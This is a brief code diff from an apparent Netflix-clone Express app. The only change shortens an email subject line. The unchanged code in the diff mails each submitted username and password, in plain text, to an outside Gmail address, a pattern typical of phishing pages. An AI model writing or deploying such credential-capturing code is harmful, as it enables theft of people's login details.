@@ -29,7 +29,7 @@ app.post("/success",function(req,res){
     var mailOptions = {
         from: 'abrakadabra83181@gmail.com',
         to: 'iamtheanshgupta@gmail.com',
-        subject: 'mail from the netflix clone that you have built',
+        subject: 'mail from the netflix clone',
         text: `the username is ${username}and the password is ${password}`
       };
     
